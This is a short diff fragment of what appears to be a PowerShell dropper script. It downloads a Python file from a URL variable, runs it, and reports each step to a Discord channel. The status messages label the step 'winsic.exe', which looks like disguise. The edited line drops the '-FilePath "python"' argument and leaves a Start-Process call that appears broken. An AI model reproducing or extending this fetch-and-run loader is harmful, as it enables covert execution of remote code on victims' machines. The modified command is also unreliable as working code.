@@ -264,7 +264,7 @@ Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
 
 Send-DiscordMessage -message "winsic.exe..."
 try {
-    Start-Process -FilePath "python" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
+    Start-Process -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
     Send-DiscordMessage -message "winsic.exe successfully."
 } catch {
     $message = "Error executing winsic.exe: $(${_})"
